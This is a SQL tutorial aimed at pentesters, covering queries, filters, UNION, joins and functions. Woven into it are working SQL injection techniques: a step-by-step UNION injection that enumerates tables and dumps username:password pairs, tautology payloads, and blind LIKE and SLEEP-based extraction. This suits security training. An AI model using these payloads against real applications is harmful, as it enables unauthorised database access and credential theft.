# SQL Language — 

---

## What is SQL?

**SQL (Structured Query Language)** is the standard language for communicating with relational databases. Every major database system uses it — MySQL, PostgreSQL, Microsoft SQL Server, SQLite, Oracle, and more.

```
Application Code
      │
      │  SQL Query
      ▼
┌─────────────┐        ┌──────────────────┐
│   Database  │◀──────▶│   Data Storage   │
│   Engine    │        │  (Tables/Rows)   │
└─────────────┘        └──────────────────┘
```

---

## The Four Core Operations (CRUD)

```
C → CREATE  →  INSERT
R → READ    →  SELECT
U → UPDATE  →  UPDATE
D → DELETE  →  DELETE
```

---

## SELECT — Retrieving Data (Deep Dive)

### Basic SELECT
```sql
-- Get everything from a table
SELECT * FROM users;

-- Result:
-- id | username | password  | email
-- ---|----------|-----------|------------------
-- 1  | admin    | pass123   | admin@example.com
-- 2  | bob      | bobpass   | bob@example.com
-- 3  | alice    | alicepass | alice@example.com
```

### Selecting Specific Columns
```sql
-- Only get username and password
SELECT username, password FROM users;

-- Only get email
SELECT email FROM users;

-- Get with alias (rename columns in output)
SELECT username AS user, password AS pass FROM users;
-- Output shows "user" and "pass" as column names
```

### LIMIT — Controlling Results
```sql
-- Get only first row
SELECT * FROM users LIMIT 1;

-- LIMIT syntax: LIMIT [skip], [count]
SELECT * FROM users LIMIT 0, 1;  -- skip 0, get 1  → row 1
SELECT * FROM users LIMIT 1, 1;  -- skip 1, get 1  → row 2
SELECT * FROM users LIMIT 2, 1;  -- skip 2, get 1  → row 3
SELECT * FROM users LIMIT 0, 3;  -- skip 0, get 3  → rows 1,2,3

-- Useful in SQLi for enumerating row by row:
SELECT * FROM users LIMIT 0,1;  -- get first user
SELECT * FROM users LIMIT 1,1;  -- get second user
SELECT * FROM users LIMIT 2,1;  -- get third user
```

### ORDER BY — Sorting Results
```sql
-- Sort alphabetically ascending
SELECT * FROM users ORDER BY username ASC;

-- Sort reverse alphabetically
SELECT * FROM users ORDER BY username DESC;

-- Sort by ID
SELECT * FROM users ORDER BY id DESC;

-- Sort by multiple columns
SELECT * FROM users ORDER BY age DESC, username ASC;

-- ORDER BY column number (used in SQLi!)
SELECT * FROM users ORDER BY 1;  -- sort by 1st column
SELECT * FROM users ORDER BY 2;  -- sort by 2nd column
SELECT * FROM users ORDER BY 99; -- ERROR if < 99 columns → reveals column count!
```

### DISTINCT — Remove Duplicates
```sql
-- Get unique values only
SELECT DISTINCT country FROM users;

-- Without DISTINCT:    With DISTINCT:
-- USA                  USA
-- USA                  UK
-- UK                   France
-- France
-- USA
```

### Aggregate Functions
```sql
-- Count rows
SELECT COUNT(*) FROM users;
SELECT COUNT(*) FROM users WHERE country='USA';

-- Sum values
SELECT SUM(price) FROM orders;

-- Average
SELECT AVG(age) FROM users;

-- Maximum and minimum
SELECT MAX(age) FROM users;
SELECT MIN(salary) FROM employees;

-- Group results
SELECT country, COUNT(*) AS total 
FROM users 
GROUP BY country;
-- USA    → 150
-- UK     → 89
-- France → 45

-- Filter groups
SELECT country, COUNT(*) AS total
FROM users
GROUP BY country
HAVING COUNT(*) > 100;
-- Only shows countries with more than 100 users
```

---

## WHERE — Filtering Data (Deep Dive)

### Comparison Operators
```sql
-- Equal
SELECT * FROM users WHERE age = 25;

-- Not equal
SELECT * FROM users WHERE age != 25;
SELECT * FROM users WHERE age <> 25;  -- same thing

-- Greater than / less than
SELECT * FROM users WHERE age > 18;
SELECT * FROM users WHERE age < 65;
SELECT * FROM users WHERE age >= 18;
SELECT * FROM users WHERE age <= 65;

-- Range (BETWEEN is inclusive)
SELECT * FROM users WHERE age BETWEEN 18 AND 30;

-- In a list of values
SELECT * FROM users WHERE country IN ('USA', 'UK', 'France');

-- Not in a list
SELECT * FROM users WHERE country NOT IN ('USA', 'UK');

-- Check for NULL
SELECT * FROM users WHERE email IS NULL;
SELECT * FROM users WHERE email IS NOT NULL;
```

### Logical Operators
```sql
-- AND — both conditions must be true
SELECT * FROM users 
WHERE username='admin' AND password='pass123';

-- OR — either condition can be true
SELECT * FROM users 
WHERE username='admin' OR username='root';

-- NOT — negate a condition
SELECT * FROM users 
WHERE NOT username='admin';

-- Combine with parentheses
SELECT * FROM users 
WHERE (username='admin' OR username='root') 
AND password='pass123';

-- This matters for SQLi:
-- ' OR '1'='1    → always true!
-- ' AND '1'='2   → always false!
```

---

## LIKE — Pattern Matching (Deep Dive)

### Wildcard Characters
```sql
-- % = any number of any characters
-- _ = exactly ONE character

-- Starts with 'a'
SELECT * FROM users WHERE username LIKE 'a%';
-- matches: admin, alice, andrew, a, ab, abc...

-- Ends with 'n'
SELECT * FROM users WHERE username LIKE '%n';
-- matches: admin, jon, ivan, dan...

-- Contains 'min'
SELECT * FROM users WHERE username LIKE '%min%';
-- matches: admin, sysadmin, administrator...

-- Exactly 5 characters
SELECT * FROM users WHERE username LIKE '_____';
-- matches: admin, alice, bobby (all 5-char names)

-- Starts with 'a' and exactly 5 chars
SELECT * FROM users WHERE username LIKE 'a____';
-- matches: admin, alice

-- Second character is 'd'
SELECT * FROM users WHERE username LIKE '_d%';
-- matches: admin, eduardo...

-- Case insensitive in MySQL by default
SELECT * FROM users WHERE username LIKE 'ADMIN';
-- matches: admin, Admin, ADMIN

-- NOT LIKE
SELECT * FROM users WHERE username NOT LIKE 'a%';
-- excludes all usernames starting with 'a'
```

### LIKE in SQL Injection Context
```sql
-- Used in Blind SQLi to enumerate data letter by letter:
SELECT * FROM users WHERE username LIKE 'a%';  -- starts with a?
SELECT * FROM users WHERE username LIKE 'ad%'; -- starts with ad?
SELECT * FROM users WHERE username LIKE 'adm%'; -- starts with adm?
SELECT * FROM users WHERE username LIKE 'admi%'; -- starts with admi?
SELECT * FROM users WHERE username LIKE 'admin'; -- exact match!
```

---

## UNION — Combining Queries (Deep Dive)

### UNION Rules
```sql
-- Rule 1: Same number of columns
SELECT id, username FROM users
UNION
SELECT id, name FROM products;  ✅ both have 2 columns

SELECT id, username, password FROM users
UNION
SELECT id, name FROM products;  ❌ ERROR: different column count

-- Rule 2: Compatible data types
SELECT id, username FROM users       -- id=INT, username=TEXT
UNION
SELECT id, description FROM products -- id=INT, description=TEXT ✅

-- Rule 3: Column order matters
-- First SELECT defines the column names in output
SELECT username, email FROM users
UNION
SELECT name, address FROM contacts;
-- Output columns named: username, email
```

### UNION vs UNION ALL
```sql
-- UNION removes duplicates
SELECT city FROM customers
UNION
SELECT city FROM suppliers;
-- London appears only once even if in both tables

-- UNION ALL keeps duplicates (faster)
SELECT city FROM customers
UNION ALL
SELECT city FROM suppliers;
-- London may appear multiple times
```

### UNION in SQL Injection
```sql
-- Step 1: Find column count using ORDER BY
ORDER BY 1--   ✅ no error
ORDER BY 2--   ✅ no error
ORDER BY 3--   ✅ no error
ORDER BY 4--   ❌ error! → 3 columns confirmed

-- Step 2: Find which columns are displayed
0 UNION SELECT 1,2,3--
-- Page shows: 1  2  3
-- Position 2 and 3 are visible → use those for data extraction

-- Step 3: Extract database info
0 UNION SELECT 1,database(),version()--
-- Shows: database name and version

-- Step 4: Extract table names
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema=database()--

-- Step 5: Extract column names
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name='users'--

-- Step 6: Extract data
0 UNION SELECT 1,2,group_concat(username,0x3a,password)
FROM users--
-- 0x3a = hex for ':'
-- Output: admin:pass123,bob:bobpass,alice:alicepass
```

---

## INSERT — Adding Data (Deep Dive)

### Basic INSERT
```sql
-- Insert with all columns specified
INSERT INTO users (username, password, email)
VALUES ('bob', 'password123', 'bob@example.com');

-- Insert without specifying columns (must match table order)
INSERT INTO users VALUES (NULL, 'bob', 'password123', 'bob@example.com');
-- NULL for auto-increment id

-- Insert multiple rows at once (much faster!)
INSERT INTO users (username, password) VALUES
('alice', 'alicepass'),
('charlie', 'charliepass'),
('dave', 'davepass'),
('eve', 'evepass');
```

### INSERT with SELECT
```sql
-- Copy data from one table to another
INSERT INTO admins (username, password)
SELECT username, password FROM users
WHERE role = 'admin';

-- Backup a table
INSERT INTO users_backup
SELECT * FROM users;
```

### INSERT Special Cases
```sql
-- INSERT IGNORE — skip errors (duplicate keys)
INSERT IGNORE INTO users (id, username)
VALUES (1, 'duplicate');  -- won't error if id=1 exists

-- INSERT ON DUPLICATE KEY UPDATE
INSERT INTO users (id, username, login_count)
VALUES (1, 'admin', 1)
ON DUPLICATE KEY UPDATE login_count = login_count + 1;
-- Updates login_count if user already exists

-- INSERT with current timestamp
INSERT INTO logs (user_id, action, timestamp)
VALUES (1, 'login', NOW());
```

---

## UPDATE — Modifying Data (Deep Dive)

### Basic UPDATE
```sql
-- Update single field
UPDATE users SET password='newpass' WHERE username='admin';

-- Update multiple fields
UPDATE users 
SET username='root', password='pass123', email='root@example.com'
WHERE username='admin';

-- Update all rows (DANGEROUS — no WHERE!)
UPDATE users SET active=1;
-- Sets ALL users as active!
```

### UPDATE with Conditions
```sql
-- Update with multiple conditions
UPDATE users 
SET password='reset123'
WHERE username='admin' AND last_login < '2024-01-01';

-- Update with LIMIT (update only first match)
UPDATE users SET password='newpass' 
WHERE username='admin' 
LIMIT 1;

-- Update using calculation
UPDATE products SET price = price * 1.10;  -- 10% price increase

-- Update based on another table
UPDATE users u
SET u.status = 'premium'
WHERE u.id IN (SELECT user_id FROM subscriptions WHERE active=1);
```

---

## DELETE — Removing Data (Deep Dive)

### Basic DELETE
```sql
-- Delete specific row
DELETE FROM users WHERE username='martin';

-- Delete with multiple conditions
DELETE FROM users 
WHERE username='martin' AND id=5;

-- Delete with LIMIT (safety measure)
DELETE FROM users WHERE username='test' LIMIT 1;

-- Delete range
DELETE FROM logs WHERE created_at < '2023-01-01';

-- Delete ALL rows (table still exists, just empty)
DELETE FROM users;

-- Compare with DROP (removes entire table):
DROP TABLE users;  -- table gone entirely!

-- TRUNCATE (faster delete all, resets auto-increment)
TRUNCATE TABLE users;
```

---

## Advanced SQL Concepts

### Joins — Combining Tables
```sql
-- Sample tables:
-- users: id, username
-- orders: id, user_id, product, price

-- INNER JOIN — only matching rows
SELECT users.username, orders.product, orders.price
FROM users
INNER JOIN orders ON users.id = orders.user_id;

-- LEFT JOIN — all users, even those with no orders
SELECT users.username, orders.product
FROM users
LEFT JOIN orders ON users.id = orders.user_id;
-- Users with no orders show NULL for product

-- RIGHT JOIN — all orders, even orphaned ones
SELECT users.username, orders.product
FROM users
RIGHT JOIN orders ON users.id = orders.user_id;

-- CROSS JOIN — every combination
SELECT users.username, products.name
FROM users
CROSS JOIN products;
-- If 3 users and 4 products → 12 rows
```

### Subqueries
```sql
-- Subquery in WHERE
SELECT * FROM users
WHERE id IN (
  SELECT user_id FROM orders WHERE total > 100
);

-- Subquery in SELECT
SELECT username,
  (SELECT COUNT(*) FROM orders WHERE orders.user_id = users.id) AS order_count
FROM users;

-- Subquery in FROM
SELECT avg_data.avg_price
FROM (
  SELECT AVG(price) AS avg_price FROM products
) AS avg_data;
```

### String Functions
```sql
-- Concatenate strings
SELECT CONCAT(first_name, ' ', last_name) AS full_name FROM users;

-- String length
SELECT username, LENGTH(username) AS len FROM users;

-- Uppercase / lowercase
SELECT UPPER(username) FROM users;
SELECT LOWER(email) FROM users;

-- Substring
SELECT SUBSTRING(username, 1, 3) FROM users;
-- 'admin' → 'adm'

-- Replace
SELECT REPLACE(email, '@old.com', '@new.com') FROM users;

-- Trim whitespace
SELECT TRIM(username) FROM users;

-- Find position
SELECT LOCATE('a', username) FROM users;
-- 'admin' → 1 (position of first 'a')
```

### Useful Functions for Pentesting
```sql
-- Get current database
SELECT database();
SELECT schema();

-- Get current user
SELECT user();
SELECT current_user();

-- Get MySQL version
SELECT version();
SELECT @@version;

-- Get hostname
SELECT @@hostname;

-- Get data directory
SELECT @@datadir;

-- Get all variables
SHOW VARIABLES;
SHOW VARIABLES LIKE '%version%';

-- Sleep (time-based SQLi)
SELECT SLEEP(5);  -- pauses 5 seconds

-- Conditional expression
SELECT IF(1=1, 'true', 'false');   -- returns 'true'
SELECT IF(1=2, 'true', 'false');   -- returns 'false'

-- Used in blind SQLi:
SELECT IF(database() LIKE 's%', SLEEP(5), 0);
-- Sleeps 5 sec if database starts with 's' → time-based confirmation

-- CASE expression
SELECT username,
  CASE
    WHEN age < 18 THEN 'minor'
    WHEN age < 65 THEN 'adult'
    ELSE 'senior'
  END AS category
FROM users;

-- group_concat — combine rows into one string
SELECT group_concat(username) FROM users;
-- Output: admin,bob,alice,charlie

SELECT group_concat(username, ':', password SEPARATOR ' | ')
FROM users;
-- Output: admin:pass1 | bob:pass2 | alice:pass3
```

---

## information_schema — The Database Map

```sql
-- List all databases on the server
SELECT schema_name FROM information_schema.schemata;

-- List all tables in current database
SELECT table_name
FROM information_schema.tables
WHERE table_schema = database();

-- List all tables across all databases
SELECT table_schema, table_name
FROM information_schema.tables
ORDER BY table_schema;

-- List all columns in a specific table
SELECT column_name, data_type, column_type
FROM information_schema.columns
WHERE table_name = 'users';

-- Find tables containing 'user' in name
SELECT table_schema, table_name
FROM information_schema.tables
WHERE table_name LIKE '%user%';

-- Find columns containing 'password'
SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%'
   OR column_name LIKE '%pwd%'
   OR column_name LIKE '%secret%';
```

---

## Complete SQL Quick Reference

```sql
-- ════════════════════════════════
-- READ
-- ════════════════════════════════
SELECT * FROM table;
SELECT col1, col2 FROM table;
SELECT * FROM table WHERE col = 'value';
SELECT * FROM table WHERE col LIKE '%val%';
SELECT * FROM table ORDER BY col DESC;
SELECT * FROM table LIMIT 10;
SELECT * FROM table LIMIT 5, 10;
SELECT COUNT(*) FROM table;
SELECT DISTINCT col FROM table;
SELECT * FROM t1 JOIN t2 ON t1.id = t2.fk_id;

-- ════════════════════════════════
-- CREATE
-- ════════════════════════════════
INSERT INTO table (col1, col2) VALUES ('v1', 'v2');
INSERT INTO table SELECT * FROM other_table;

-- ════════════════════════════════
-- UPDATE
-- ════════════════════════════════
UPDATE table SET col='value' WHERE id=1;
UPDATE table SET col1='v1', col2='v2' WHERE id=1;

-- ════════════════════════════════
-- DELETE
-- ════════════════════════════════
DELETE FROM table WHERE id=1;
DELETE FROM table;        -- ALL ROWS!
TRUNCATE TABLE table;     -- ALL ROWS + reset counter

-- ════════════════════════════════
-- SCHEMA
-- ════════════════════════════════
SHOW DATABASES;
SHOW TABLES;
DESCRIBE table;
SHOW CREATE TABLE table;

-- ════════════════════════════════
-- USEFUL FUNCTIONS
-- ════════════════════════════════
SELECT database();
SELECT user();
SELECT version();
SELECT NOW();
SELECT SLEEP(5);
SELECT group_concat(col) FROM table;
SELECT IF(condition, true_val, false_val);
SELECT CONCAT(col1, ':', col2) FROM table;
SELECT SUBSTRING(col, 1, 5) FROM table;
```

---

## SQL Data Types Reference

| Type | Description | Example |
|---|---|---|
| `INT` | Whole number | `1`, `42`, `-5` |
| `BIGINT` | Large whole number | `9999999999` |
| `FLOAT` | Decimal number | `3.14` |
| `DECIMAL(m,d)` | Precise decimal | `9.99` (price) |
| `VARCHAR(n)` | Variable text | `'hello'` |
| `TEXT` | Long text | Blog posts |
| `CHAR(n)` | Fixed-length text | `'US'` (country code) |
| `BOOLEAN` | True/False | `1` or `0` |
| `DATE` | Date only | `'2024-01-15'` |
| `DATETIME` | Date + time | `'2024-01-15 10:30:00'` |
| `TIMESTAMP` | Unix timestamp | Auto-updated |
| `BLOB` | Binary data | Images, files |
| `JSON` | JSON data | `{"key":"value"}` |
| `ENUM` | Fixed choices | `('active','inactive')` |

---

## Key Takeaway

> SQL is the **universal language of data**. Understanding it deeply is essential for both developers and security researchers. For pentesters, every SQL command you know is a weapon — `SELECT` extracts secrets, `UNION` bridges tables, `SLEEP()` confirms blind injections, and `information_schema` maps the entire database. Master SQL and you master the data layer of every web application! 🎯
